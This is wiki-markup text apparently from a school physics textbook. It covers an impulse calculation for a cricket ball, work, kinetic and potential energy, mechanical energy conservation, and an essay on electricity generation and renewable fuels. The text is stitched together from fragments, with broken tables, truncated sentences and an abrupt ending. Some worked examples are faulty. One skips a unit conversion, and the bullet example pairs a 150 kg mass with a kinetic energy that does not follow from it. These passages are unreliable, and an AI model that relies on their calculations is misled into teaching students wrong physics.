* the time of contact between bat and ball

all except the time in the wrong units!

Answer to (i):

Step 2 : 

What is being asked? We are asked to calculate the impulse

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{Impulse} = \Delta\overrightarrow{p} =\overrightarrow{F}_{Res}\Delta t. \end{matrix}&lt;/math&gt;&lt;/center&gt;

Since we do not have the force exerted by the bat on the ball (&lt;math&gt;\overrightarrow{F}_{Res}&lt;/math&gt;), we have to calculate the impulse from the change in momentum of the ball. Now, since 

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{p} &amp;=&amp;\overrightarrow{p}_{final}-\overrightarrow{p}_{initial}\\&amp;=&amp; m\overrightarrow{v} - m\overrightarrow{u},\end{matrix}&lt;/math&gt;&lt;/center&gt;

we need the ball's mass, initial velocity and final velocity, which we are given.

Step 3 : 
Firstly let us change units for the mass

&lt;center&gt;&lt;math&gt;\begin{matrix}1000g &amp;=&amp; 1kg\\1 &amp;=&amp; \frac{1kg}{1000g}\\156g \times 1 &amp;=&amp; 156g \times \frac{1kg}{1000g}\\&amp;=&amp; 0.156kg\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 

Next we change units for the velocity

&lt;center&gt;&lt;math&gt;\begin{matrix}1km &amp;=&amp; 1000 m\\1 &amp;=&amp; \frac{1000m}{1km}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}3600s &amp;=&amp; 1hr\\1 &amp;=&amp; \frac{1hr}{3600 s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}54\frac{km}{hr}\times 1\times1 &amp;=&amp;54\frac{km}{hr}\times\frac{1000m}{1km}\times\frac{1hr}{3600 s}\\&amp;=&amp; 15\frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}36\frac{km}{hr}\times 1\times1 &amp;=&amp;36\frac{km}{hr}\times\frac{1000m}{1km}\times\frac{1hr}{3600 s}\\&amp;=&amp; 10\frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 5 : 

Next we must choose a positive direction. Let us choose the direction from the batsman to the bowler as the positive direction. Then the initial velocity of the ball is &lt;math&gt;\overrightarrow{u}=-15\ m.s^{-1}&lt;/math&gt;, while the final velocity of the ball is &lt;math&gt;\overrightarrow{v}=+10\ m.s^{-1}&lt;/math&gt;  

Step 6 : 

Now we calculate the change in momentum,

&lt;u&gt;Direction from batsman to bowler is the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta\overrightarrow{p} &amp;=&amp;\overrightarrow{p}_{final}-\overrightarrow{p}_{initial}\\&amp;=&amp; m\overrightarrow{v}-m\overrightarrow{u}\\&amp;=&amp; m(\overrightarrow{v}-\overrightarrow{u})\\&amp;=&amp;(0.156kg)((+10\ m.s^{-1})-(-15\ m.s^{-1}))\\&amp;=&amp; +3.9\ kg.m.s^{-1}\\&amp;=&amp; 3.9\ kg.m.s^{-1}\ \textbf{ in\ the\ direction\ from\ batsman\ to\ bowler}\end{matrix}&lt;/math&gt;&lt;/center&gt;

where we remembered in the last step to include the direction of the change in momentum in words.

Step 7 : 

Finally since impulse is just the change in momentum of the ball,

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{Impulse} &amp;=&amp; \Delta\overrightarrow{p}\\&amp;=&amp; 3.9\ \mbox{kg} \cdot \mbox{m} \cdot \mbox{s}^{-1}\\&amp;=&amp; 3.9\ \mbox{N} \cdot \mbox{s} \ \textbf{ in\ the\ direction\ from\ batsman\ to\ bowler}\end{matrix}&lt;/math&gt;&lt;/center&gt;

Answer to (ii):

Step 8 : 

What is being asked? We are asked to calculate the average force exerted by the bat on the ball, &lt;math&gt;\overrightarrow{F}_{Res}&lt;/math&gt;. Now, 

&lt;center&gt;&lt;math&gt;\begin{matrix}\mathrm{Impulse} = \overrightarrow{F}_{Res}\Delta t = \Delta\overrightarrow{p}.\end{matrix}&lt;/math&gt;&lt;/center&gt;

We are given &lt;math&gt;\Delta t&lt;/math&gt; and we have calculated the change in momentum or impulse of the ball in part (i)!

Step 9 : 

Next we choose a positive direction. Let us choose the direction from the batsman to the bowler as the positive direction. Then substituting,

&lt;u&gt;Direction from batsman to bowler is the positive direction&lt;/u&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{F}_{Res}\Delta t &amp;=&amp; \mathrm{Impulse}\\\overrightarrow{F}_{Res}(0.13s) &amp;=&amp; +3.9\frac{kg.m}{s}\\\overrightarrow{F}_{Res} &amp;=&amp; \frac{+3.9\frac{\mbox{kg} \cdot \mbox{m}}{\mbox{s}}}{0.13 \mbox{ s}}\\&amp;=&amp; 30 \mbox{ N} \ \textbf{ in\ the\ direction\ from\ batsman\ to\ bowler}\end{matrix}&lt;/math&gt;&lt;/center&gt;

where we remembered in the final step to include the direction of the force in words.</text>

'''Momentum''': The ''momentum'' of an object is defined as its mass multiplied by its velocity.

'''Momentum of a System''': The ''total momentum of a system'' is the sum of the momenta of each of the objects in the system.

'''Principle of Conservation of Linear Momentum:''': `The total linear momentum of an isolated system is constant' or `In an isolated
system the total momentum before a collision (or explosion) is equal to the total momentum after the collision (or explosion)'.

'''Law of Momentum:''': The applied resultant force acting on an object is equal to the rate of change of the object's momentum and
this force is in the direction of the change in momentum.</text>

= What are Work and Energy? =

During this chapter you will discover that work and energy are very closely related: We consider the ''energy'' of an object as its
''capacity to do work'' and doing ''work'' as the process of transferring energy from one object or form to another. In other words,

* an object with lots of energy can do lots of work.
* when work is done, energy is lost by the object doing work and gained by the object on which the work is done.

Lifting objects or throwing them requires that you do work on them. Even making electricity flow requires that something does work. Something
must have energy and transfer it through doing work to make things happen.</text>

|- 
| align=&quot;RIGHT&quot; | ''s''
| align=&quot;LEFT&quot; | : displacement of the object (''m'')
|}
&lt;/blockquote&gt;


It is very important to note that for work to be done there must be a component of the applied force in the direction of motion. Forces perpendicular to the direction of motion do no work.

As with all physical quantities, work must have units. As follows from the definition, work is measured in ''N''.''m''. The name given to this combination of S.I. units is the joule (''J''). 

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:''' 
|- 
| align=&quot;CENTER&quot; | 
1 joule is the work done when an object is moved 1''m'' under the application of a force of 1''N'' in the direction of motion.
|}
&lt;/blockquote&gt;


The work done by an object can be positive or negative. Since force (''F''&lt;sub&gt;|&lt;/sub&gt;) and displacement (''s'') are both vectors, the result of the above equation depends on their directions:

* If ''F''&lt;sub&gt;|&lt;/sub&gt; acts in the same direction as the motion then positive work is being done. In this case the object on which the force is applied gains energy.
* If the direction of motion and ''F''&lt;sub&gt;|&lt;/sub&gt; are opposite, then negative work is being done. This means that energy is transferred in the opposite direction. For example, if you try to push a car uphill by applying a force up the slope and instead the car rolls down the hill you are doing negative work on the car. Alternatively, the car is doing positive work on you!

==Worked Example 38 Calculating Work Done I==
'''Question:''' If you push a box 20''m'' forward by applying a force of 15''N'' in the forward direction, what is the work you have done on the box?

'''Answer:'''

Step 1 : Analyse the question to determine what information is provided

* The force applied is ''F'' = 15''N''.
* The distance moved is ''s'' = 20''m''.
* The applied force and distance moved are in the same direction. Therefore, &lt;math&gt;F_{\|}=15N&lt;/math&gt;  
These quantities are all in the correct units, so no unit conversions are required.


Step 2 : Analyse the question to determine what is being asked

* We are asked to find the work done on the box. We know from the definition that work done is ''W'' = ''F''&lt;sub&gt;|&lt;/sub&gt;''s''

Step 3 : Next we substitute the values and calculate the work done

&lt;center&gt;&lt;math&gt;\begin{matrix}W&amp;=&amp;F_{\|} s\\&amp;=&amp; (15N)(20m)\\&amp;=&amp; 300\ N\cdot m\\&amp;=&amp; 300\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;


Remember that the answer must be ''positive'' as the applied force and the motion are in the same
direction (forwards). In this case, you (the pusher) lose energy, while the box gains energy.

==Worked Example 39 Calculating Work Done II==
'''Question:''' What is the work done by you on a car, if you try to push the car up a hill by applying a force of 40''N'' directed up the slope, but it slides downhill 30''cm''?

'''Answer:''' 

Step 1 : Analyse the question to determine what information is provided

* The force applied is ''F'' = 40''N''
* The applied force and distance moved are in opposite directions. Therefore, if we take ''s'' = 0.3''m'', then &lt;math&gt;F_{\|}=-40N&lt;/math&gt;.

Step 2 : Analyse the question to determine what is being asked

* We are asked to find the work done on the car by you. We know that work done is ''W'' = ''F''&lt;sub&gt;|&lt;/sub&gt;''s''

Step 3 : Substitute the values and calculate the work done

Again we have the applied force and the distance moved so we can proceed with calculating the work done:

&lt;center&gt;&lt;math&gt;\begin{matrix}W&amp;=&amp;F_{\|} s\\&amp;=&amp; (- 40N)(0.3m)\\&amp;=&amp; -12N\cdot m\\&amp;=&amp; -12\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

Note that the answer must be ''negative'' as the applied force and the motion are in opposite
directions. In this case the car does work on the person trying to push.

&lt;hr style=&quot;background-color:red&quot; /&gt;

What happens when the applied force and the motion are not parallel? If there is an angle between the direction of motion and the applied force then to determine the work done we have to calculate the ''component'' of the applied force ''parallel'' to the direction of motion. Note that this
means a force perpendicular to the direction of motion can do no work.

==Worked Example 40 Calculating Work Done III==
'''Question:''' Calculate the work done on a box, if it is pulled 5''m''
along the ground by applying a force of ''F'' = 10''N'' at an angle of 60&lt;sup&gt;o&lt;/sup&gt; to
the horizontal.

'''Answer:'''

Step 1 : 

Analyse the question to determine what information is provided

* The force applied is ''F'' = 10''N''
* The distance moved is ''s'' = 5''m'' along the ground
* The angle between the applied force and the motion is 60&lt;sup&gt;o&lt;/sup&gt;

These quantities are in the correct units so we do not need to perform any unit conversions.

Step 2 : 
Analyse the question to determine what is being asked

* We are asked to find the work done on the box.

Step 3 : 
Calculate the component of the applied force in the direction of motion

Since the force and the motion are not in the same direction, we must first calculate the component of the force in the direction of the motion.

[[Image:Fhsst_wrkeng1.png|71px|]]

From the force diagram we see that the component of the applied force parallel to the ground is

&lt;center&gt;&lt;math&gt;\begin{matrix}F_{||}&amp;=&amp;F\cdot \cos(60^o)\\&amp;=&amp; 10N\cdot \cos(60^o)\\&amp;=&amp; 5\ N\end{matrix}&lt;/math&gt;&lt;/center&gt;

Step 4 : 
Substitute and calculate the work done

Now we can calculate the work done on the box:

&lt;center&gt;&lt;math&gt;\begin{matrix}W&amp;=&amp;F_{\|} s\\&amp;=&amp; (5N)(5m) \\&amp;=&amp; 25\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

Note that the answer is positive as the component of the force ''F''&lt;sub&gt;|&lt;/sub&gt; is in the same direction as the motion.

= Energy =

As we mentioned earlier, energy is the capacity to do work. When positive work is done on an object, the system doing the work loses
energy. In fact, '''the energy lost by a system is exactly equal to the work done by the system.'''

Like work (''W'') the unit of energy (''E'') is the joule (J). This follows as work is just the transfer of energy.

A very important property of our universe which was discovered around 1890 is that energy is conserved.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | 
Energy is never created nor destroyed, but merely
|- 
| align=&quot;CENTER&quot; | 
transformed from one form to another.
|}
&lt;/blockquote&gt;

Energy conservation and the conservation of matter are the principles on which classical mechanics is built.

When work is done on an object by a system:
|- 
| align=&quot;CENTER&quot; | 
-the object gains energy equal to the work done by the system
|- 
| align=&quot;CENTER&quot; | '''Work Done = Energy Transferred'''
|}
&lt;/blockquote&gt;
Thermal energy (heat) is the disorganized movement of microscopic particles. Once energy is converted to this form, it has limited usefulness for doing further work in the system. Friction is the general name for forces that converts energy to heat.
&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;

|- 
| align=&quot;CENTER&quot; | '''IN THE PRESENCE OF FRICTION'''
|- 
| align=&quot;CENTER&quot; | When work is done by a system:
|- 
| align=&quot;CENTER&quot; | -only some of the energy lost by the system is transferred into useful energy
|- 
| align=&quot;CENTER&quot; | -the rest of the energy transferred is lost to heat by friction
|- 
| align=&quot;CENTER&quot; | '''Total Work Done = Useful Work Done + Work Done Against Friction'''
|}
&lt;/blockquote&gt;

== Types of Energy ==

So what different types of energy exist? Kinetic, mechanical, thermal, chemical, electrical, radiant, and atomic energy are just some of the
types that exist. By the principle of conservation of energy, whenwork is done energy is merely transferred from one object to another
and from one type of energy to another.

=== Kinetic Energy ===

Kinetic energy is the energy of motion that an object has. Objects moving in straight lines possess ''translational kinetic energy'',
which we often abbreviate as ''E''&lt;sub&gt;k&lt;/sub&gt;. 

The translational kinetic energy of an object is given by

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; colspan=&quot;2&quot; | &lt;math&gt;E_k=\frac{1}{2}mv^2&lt;/math&gt;
|- 
| align=&quot;RIGHT&quot; |
| align=&quot;LEFT&quot; |
|- 
| align=&quot;RIGHT&quot; | ''E''&lt;sub&gt;k&lt;/sub&gt;
| align=&quot;LEFT&quot; | : kinetic energy (''J'')
|- 
| align=&quot;RIGHT&quot; | ''m''
| align=&quot;LEFT&quot; | : mass of object (''kg'')
|- 
| align=&quot;RIGHT&quot; | ''v''
| align=&quot;LEFT&quot; | : speed of the object (''m''.''s''&lt;sup&gt;-1&lt;/sup&gt;)
|}
&lt;/blockquote&gt;

Note the dependence of the kinetic energy on the speed of the object- kinetic energy is related to motion. The faster an object is
moving the greater its kinetic energy. 

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 41 Calculation of Kinetic Energy====
'''Question:''' If a rock has a mass of 1''kg'' and is thrown at 5''m''/''s'', what is its kinetic energy?

'''Answer:''' 

Step 1 : Analyse the question to determine what information is provided

* The mass of the rock ''m'' = 1''kg''
* The speed of the rock ''v'' = 5''m''/''s''

These are both in the correct units so we do not have to worry about unit conversions.

Step 2 : Analyse the question to determine what is being asked

* We are asked to find the kinetic energy. From the definition we know that to work out ''E''&lt;sub&gt;k&lt;/sub&gt;, we need to know the mass and the velocity of the object and we are given both of these values.

Step 3 : Substitute and calculate the kinetic energy

&lt;center&gt;&lt;math&gt;\begin{matrix}E_k &amp; = &amp; \frac{1}{2}mv^2 \\&amp;= &amp; \frac{1}{2}(1kg)(5\frac{m}{s})^2 \\&amp;= &amp; 12.5\frac{kg\cdot m^2}{s^2} \\&amp;=&amp; 12.5\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

To check that the units in the above example are in fact correct:

&lt;center&gt;&lt;math&gt;\begin{matrix}\frac{kg\cdot m^2}{s^2}&amp;=&amp; \left(\frac{kg\cdot m}{s^2}\right)\cdot m =N\cdot m\\&amp;=&amp; J\end{matrix}&lt;/math&gt;&lt;/center&gt;

The units are indeed correct! 

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | Study hint: Checking units is an important cross-check
and
|- 
| align=&quot;CENTER&quot; | you should get into a habit of doing this. If you, for example,
|- 
| align=&quot;CENTER&quot; | finish an exam early then checking the units in your calculations is a very good idea.

&lt;/blockquote&gt;

====Worked Example 42 Mixing Units and Kinetic Energy Calculations 1====
'''Question:''' If a car has a mass of 900''kg'' and is driving at 60''km''/''hr'', what is its kinetic energy?

'''Answer:''' 

Step 1 : 
Analyse the question to determine what information is provided

* The mass of the car ''m'' = 900''kg''

Step 2 : 
Analyse the question to determine what is being asked

* We are asked to find the kinetic energy.

Step 3 : 
Substitute and calculate

We know we need the mass and the speed to work out ''E''&lt;sub&gt;k&lt;/sub&gt; and we are given both of these
quantities. We thus simply substitute them into the equation for ''E''&lt;sub&gt;k&lt;/sub&gt;:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_k &amp; = &amp; \frac{1}{2}mv^2 \\&amp;= &amp; \frac{1}{2}(900kg)(16.67\frac{m}{s})^2 \\&amp;= &amp; 125\ 000\frac{kgm^2}{s^2} \\&amp;=&amp; 125\ 000\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

'''Question:''' If a bullet has a mass of 150''kg'' and is shot at a muzzle velocity of 960''m''/''s'', what is its kinetic energy?

'''Answer:'''

Step 1 : 
Analyse the question to determine what information is provided

* We are given the muzzle velocity which is just how fast the bullet leaves the barrel and it is ''v'' = 960''m''/''s''.

Step 2 : 
Analyse the question to determine what is being asked

* We are asked to find the kinetic energy.

Step 3 : 
Substitute and calculate

We just substitute the mass and velocity (which are known) into the equation for ''E''&lt;sub&gt;k&lt;/sub&gt;:

&lt;center&gt;&lt;math&gt;\begin{matrix}E_k &amp; = &amp; \frac{1}{2}mv^2 \\&amp;= &amp; \frac{1}{2}(150kg)(960\frac{m}{s})^2 \\&amp;= &amp; 69\ 120 \frac{kgm^2}{s^2} \\&amp;=&amp; 69\ 120\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

&lt;hr style=&quot;background-color:red&quot; /&gt;

=== Potential Energy ===
If you lift an object you have to do work on it. This means that energy is transferred to the object. But where is this energy? This
energy is stored in the object and is called ''potential energy''. The reason it is called potential energy is because if we
let go of the object it would move.

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | '''Definition:''' 
|- 
| align=&quot;CENTER&quot; | 
Potential energy is the energy an object has due to its position or state.
|}
&lt;/blockquote&gt;

As an object raised above the ground falls, its '' potential energy'' is released and transformed into kinetic energy. The further it falls the faster it moves as more of the stored potential energy
is transferred into kinetic energy. Remember, energy is never created nor destroyed, but merely transformed from one type to another. In this case potential energy is lost but an equal amount of
kinetic energy is gained.


In the example of a falling mass the potential energy is known as ''gravitational potential energy'' as it is the gravitational force exerted by the earth which causes the mass to accelerate towards the ground. The gravitational field of the earth is what does the work in this case.


Another example is a rubber-band. In order to stretch a rubber-band we have to do work on it. This means we transfer energy to the rubber-band and it gains potential energy. This potential energy is called '' elastic potential energy''. Once released, the rubber-band begins to move and elastic potential energy is transferred into kinetic energy.


=== Gravitational Potential Energy ===
As we have mentioned, when lifting an object it gains gravitational potential energy. One is free to define any level as corresponding to
zero gravitational potential energy. Objects above this level then possess positive potential energy, while those below it have negative
potential energy. To avoid negative numbers in a problem, always choose the lowest level as the zero potential mark. The change in gravitational
potential energy of an object is given by:

&lt;blockquote style=&quot;background: white; border: 1px solid black; padding: 1em;&quot;&gt;
{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; colspan=&quot;2&quot; | &lt;math&gt;\Delta E_{P}=mg\Delta h&lt;/math&gt;
|- 
| align=&quot;RIGHT&quot; |
| align=&quot;LEFT&quot; |
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\Delta E_{P}&lt;/math&gt;
| align=&quot;LEFT&quot; | : Change in gravitational potential energy (''J'')
|- 
| align=&quot;RIGHT&quot; | ''m''
| align=&quot;LEFT&quot; | : mass of object (''kg'')
|- 
| align=&quot;RIGHT&quot; | ''g''
| align=&quot;LEFT&quot; | : acceleration due to gravity (''m''.''s''&lt;sup&gt;-2&lt;/sup&gt;)
|- 
| align=&quot;RIGHT&quot; | &lt;math&gt;\Delta h&lt;/math&gt;
| align=&quot;LEFT&quot; | : change in height (''m'')
|}
&lt;/blockquote&gt;

When an object is lifted it gains gravitational potential energy, while it loses gravitational potential energy as it falls.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 44 Gravitational potential energy====
'''Question:''' How much potential energy does a brick with a mass of 1''kg'' gain if it is lifted 4''m''.

'''Answer:'''

Step 1 : Analyse the question to determine what information is provided

* The mass of the brick is ''m'' = 1''kg''
* The height lifted is &lt;math&gt;\Delta h=4m&lt;/math&gt;

These are in the correct units so we do not have to worry about unit conversions.

Step 2 : Analyse the question to determine what is being asked

* We are asked to find the gain in potential energy of the object.

Step 3 : Identify the type of potential energy involved

Since the block is being lifted we are dealing with gravitational potential energy. To work out &lt;math&gt;\Delta E_P&lt;/math&gt;, we need to know the mass of the object and the height lifted. As both of these are given, we just substitute them into the equation for &lt;math&gt;\Delta E_P&lt;/math&gt;.

Step 4 : Substitute and calculate

&lt;center&gt;&lt;math&gt;\begin{matrix}\Delta E_P &amp; = &amp; mg\Delta h \\&amp;= &amp; (1kg)\left(10\frac{m}{s^2}\right)(4m) \\&amp;= &amp; 40\frac{kg\cdot m^2}{s^2} \\&amp;=&amp; 40\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;</text>

= Mechanical Energy and Energy Conservation =

'''Kinetic energy and potential energy are together referred to as mechanical energy'''. The total mechanical energy (''U'') of an object is then the sum of
its kinetic and potential energies:

{| 
|- 
|&lt;math&gt;\begin{matrix}U&amp;=&amp;E_P+E_K  \\U&amp;=&amp; mgh +\frac{1}{2}mv^2\end{matrix}&lt;/math&gt;

&lt;/blockquote&gt;

This principle of conservation of mechanical energy can be a very powerful tool for solving physics problems. However, in the presence of friction some of the
mechanical energy is lost:

| align=&quot;CENTER&quot; | &lt;math&gt;\Delta U = U_{before} - U_{after} = \mathrm{Work\ Done\ Against\ Friction}&lt;/math&gt;
|}
&lt;/blockquote&gt;

==Worked Example 45 Using Mechanical Energy Conservation==
'''Question:''' A 2''kg'' metal ball is suspended from a rope. If it is released from point ''A'' and swings down to the point ''B'' (the
bottom of its arc) what is its velocity at point ''B''? 

[[Image:Fhsst_wrkeng2.png|164px|]]

'''Answer:''' 

Step 1 : Analyse the question to determine what information is provided

* The mass of the metal ball is ''m'' = 2''kg''
* The change in height going from point ''A'' to point ''B'' is ''h'' = 0.5''m''
* The ball is released from point ''A'' so the velocity at point ''A'' is zero (''v''&lt;sub&gt;A&lt;/sub&gt; = 0''m''/''s'').

These are in the correct units so we do not have to worry about unit conversions.


Step 2 : Analyse the question to determine what is being asked

* Find the velocity of the metal ball at point ''B''.

Step 3 : Determine the Mechanical Energy at ''A'' and ''B''

To solve this problem we use conservation of mechanical energy as there is no friction. Since mechanical energy is conserved,

&lt;center&gt;&lt;math&gt;\begin{matrix}U_A=U_B\end{matrix}&lt;/math&gt;&lt;/center&gt;

Therefore we need to know the mechanical energy of the ball at point ''A'' (''U''&lt;sub&gt;A&lt;/sub&gt;) and at point ''B'' (''U''&lt;sub&gt;B&lt;/sub&gt;).
The mechanical energy at point ''A'' is

&lt;center&gt;&lt;math&gt;\begin{matrix}U_A = mgh_A + \frac{1}{2}m(v_A)^2\end{matrix}&lt;/math&gt;&lt;/center&gt;

We already know ''m'', ''g'' and ''v''&lt;sub&gt;A&lt;/sub&gt;, but what is ''h''&lt;sub&gt;A&lt;/sub&gt;? Note that if we
let ''h''&lt;sub&gt;B&lt;/sub&gt; = 0 then ''h''&lt;sub&gt;A&lt;/sub&gt; = 0.5''m'' as ''A'' is 0.5''m'' above ''B''. In problems
you are always free to choose a line corresponding to ''h'' = 0. In this example the most obvious choice is to make point ''B'' correspond to
''h'' = 0.

Now we have,

&lt;center&gt;&lt;math&gt;\begin{matrix}U_A &amp;=&amp; (2kg)\left(10\frac{m}{s^2}\right)(0.5m)+\frac{1}{2}(2kg)(0)^2\\&amp;=&amp; 10\ J\end{matrix}&lt;/math&gt;&lt;/center&gt;

As already stated ''U''&lt;sub&gt;B&lt;/sub&gt; = ''U''&lt;sub&gt;A&lt;/sub&gt;. Therefore ''U''&lt;sub&gt;B&lt;/sub&gt; = 10''J'', but using the definition of mechanical energy

&lt;center&gt;&lt;math&gt;\begin{matrix}U_B &amp;=&amp; mgh_B + \frac{1}{2}m(v_B)^2\\&amp;=&amp; \frac{1}{2}m(v_B)^2\end{matrix}&lt;/math&gt;&lt;/center&gt;

because ''h''&lt;sub&gt;B&lt;/sub&gt; = 0. This means that

&lt;center&gt;&lt;math&gt;\begin{matrix}10J&amp;=&amp;\frac{1}{2}(2kg)(v_B)^2\\(v_B)^2 &amp;=&amp; 10\frac{J}{kg}\\v_B &amp;=&amp; \sqrt{10}\frac{m}{s}\end{matrix}&lt;/math&gt;&lt;/center&gt;</text>

=Energy=

==Asogan Moodaly==

Asogan Moodaly received his Bachelor of Science degree (with honours) in Mechanical Engineering from the University
of Natal, Durban in South Africa. For his final year design project he worked on a 3-axis filament winding machine for composite (Glass
re-enforced plastic in this case) piping. He worked in Vereeniging, Gauteng at Mine Support Products (a subsidiary of Dorbyl Heavy
Engineering) as the design engineer once he graduated. He currently lives in the Vaal Triangle area and is working for Sasol Technology
Engineering as a mechanical engineer, ensuring the safety and integrity of equipment installed during projects.

==Energy and electricity. Why the fuss?==

Disclaimer: The details furnished below are very basic and for illustration purposes only.

Why do we need energy? Note that I use the word energy and not electricity. On a broad scale it stimulates economic growth, etc.,
etc. but on a personal level it allows us to lead a comfortable lifestyle.

e.g. Flick a switch and Heat for cooking Entertainment such as television and radio Heat for water and interior of house Ironing
Electronic and electrical devices such as alarms, garage doors, etc.

In a modern household this energy is provided in the form of electricity which is powered via fossil fuels or nuclear.

How is electricity made? In a nutshell: By moving a magnet through or near a set of conducting coils.

[[Image:Fhsst_wrkeng3.png|364px|]]

Most power stations produce steam through heat (nuclear reaction or burning fossil fuels), the steam drives a turbine which moves a
magnet relative to a coil (the generator like the above but on a much larger scale i.e. bigger magnets, bigger coils, etc.), which
produces electricity that is transmitted via a power network to our homes. Gas fired plants burn gas directly in a gas turbine to
produce the same desired relative motion between permanent magnet and coil.

[[Image:Fhsst_wrkeng4.png|364px|]]

[[Image:Fhsst_wrkeng5.png|364px|]]

Coal, oil and gas are fossil fuels. Fossil fuels were created by decomposing organic (plant and animal) matter a long, long time ago
and are typically found underground. Different temperatures and pressures resulted in the organic matter transforming into coal, oil
or gas.

Why the fuss about fossil fuels?

# Fossil fuel power is bad news in the long run. It pollutes and contributes to the greenhouse effect (global warming resulting in melting polar ice caps, floods, droughts, disease, etc.).
# It s not going to last forever.
# Nuclear power is  cleaner  in terms of emissions but there s no proven way of disposing of the nuclear waste. Oh, and it won t last forever either!

Renewable Energy As the name suggests renewable energy lasts  forever . Solar (sun), wind, geothermal, wave, hydro and biomass
(organic) are all sources of energy that will last until the sun eventually explodes many billions of years from now. Hopefully the
human race will have moved from the earth by then! Generally the principal of renewable electricity generation is similar to fossil
fuel electricity generation in that electricity is generated by moving a magnet relative to a conducting coil. What is different is
the way energy is supplied to cause that motion.

The below are a few different types of available renewable energy technologies.



==Wind ==

Wind turbines catch wind that spins the blades. The blades are connected to a shaft that spins because of the wind. This spinning
shaft spins another shaft that turns a permanent magnet relative to conducting coils.

Note that the gears are used to convert the slow spinning of the 1st shaft to a faster spin on the 2nd shaft. The generator shaft needs
to spin at the correct speed to produce the right amount and quality of electricity. Some generators are now being modified to run at
slower speeds. This saves money as gears are not needed.

[[Image:Fhsst_wrkeng8.png|364px|]]

==Biomass ==
Biomass is anything organic i.e. plant or animal matter. It can be used in the place of coal as per a normal coal fired plant and is
renewable as long as the biomass e.g. wood  is handled in a sustainable manner. By sustainable I mean that suitable farming
practices are used so that the land is not over farmed which will result in the soil becoming barren and nothing growing there again.

[[Image:Fhsst_wrkeng9.png|364px|]]

Biomass can also be processed using  anaerobic digestion to produce a gas that can be burned for heat or electricity. This  biogas  is made up of a number of other gases that are similar to those found in fossil fuel natural gas   Except the amount of the gases are different. E.g. Natural gas has about 94
Anaerobic digestion: Anaerobic means &quot;No air&quot;. Therefore  anaerobic digestion  means to digest in the absence of air. Bacteria that naturally exist in organic matter will convert organic matter to biogas and fertilizer when all the air is removed.

Thousands of anaerobic digesters have been installed in rural India, Nepal and China in rural area s where cow dung, human waste and
chicken litter (faeces) are all processed using anaerobic digestion to produce gas that can be burned in the home for cooking and
heating. The leftover is used as fertilizer. 

== Geothermal Energy ==
In some places on earth, the Earth's crust is thinner than others. As a result the heat from the Earth's core escapes. The heat can be
captured by converting water to steam, and using the steam to drive a steam generator as discussed above.

Hydroelectric power Water from a river is diverted to turn a water turbine to create electricity similar to the principles of steam
generation. The water is returned to the river after driving the turbine.

==Wave Energy ==
Some wave energy generators work similarly to wind turbines except that underwater ocean currents turns the blades
instead of wind  and of course most of the structure is under water!

[[Image:Fhsst_wrkeng10.png|364px|]]

Another concept uses the rising and falling of the tides to suck air in using a one way valve. As a result air becomes compressed in a
chamber and the compressed air is let out to drive a turbine which in turn drives a generator

[[Image:Fhsst_wrkeng11.png|301px|]]

These are relatively new technologies. Liquid fuels are used mainly for transportation. Petrol and diesel are the most common liquid fuels and are obtained from
oil.

Sasol is the only company in the world that makes liquid fuels from coal and will be one of the leading companies in the world to make
liquid fuels from natural gas! The Sasol petro-chemical plants are based in Sasolburg on the border of the Free State and in Secunda in
Mpumalanga. 

However, as discussed above coal, gas and oil are fossil fuels and are not renewable. Petrol and diesel are obtained from fossil fuels
and therefore pollute and contribute to the green house effect (global warming).

==Alternatives ==
===Biodiesel ===
Oil can be extracted from plants such as the soya bean, sunflower and rapeseed by pressing it through a filter.
This oil if mixed correctly with either methanol or dry ethanol and sodium hydroxide will separate the plant oil into biodiesel,
glycerol and fertilizer.

The biodiesel can be used as produced in a conventional diesel engine with little or no modifications required.

The glycerol can be refined a bit further for pharmaceutical companies to use, or can be used to make soap.

This information is not enough.

===Ethanol ===

Corn, maize and sugar cane can be used to make ethanol as a fuel substitute for petrol. It's made by the same fermentation process
used to make alcohol. Enzymes are often used to speed up the process.

In ethanol from sugar cane production, the leftover bagasse (the fibre part of the sugar cane) can be burned in a biomass power station to produce electricity.

===Hydrogen ===

Through the process of  electrolysis electricity (hopefully clean, renewable electricity!) can split
water into hydrogen and oxygen. The stored hydrogen can be used in a  fuel cell to create electricity in a process that is opposite to
